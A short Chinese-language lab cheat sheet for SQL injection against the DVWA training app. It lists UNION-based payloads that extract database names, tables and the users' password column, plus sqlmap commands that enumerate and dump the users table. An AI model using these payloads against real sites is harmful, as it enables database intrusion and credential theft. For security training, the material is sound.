# dvwa SQL注入

判断是否有漏洞
1' and 1=1#
1' and 1=2#

判断列数
1' order by 1#
1' order by 2#
直到报错

查询使用的数据库
1' union select user(),database()#

查询数据库中的表
1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa'#

查询表中一些列的数据
1' union select user,password from users#


sqlmap
[是否有漏洞]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low"
[获取数据库]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" --dbs
[获取指定数据库表]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa --tables
[获取指定数据库表列]
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa -T users --columns
python sqlmap.py -u "http://192.168.234.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=dm5oqturp0hpbinoaq3ujmoh35; security=low" -D dvwa -T users --dump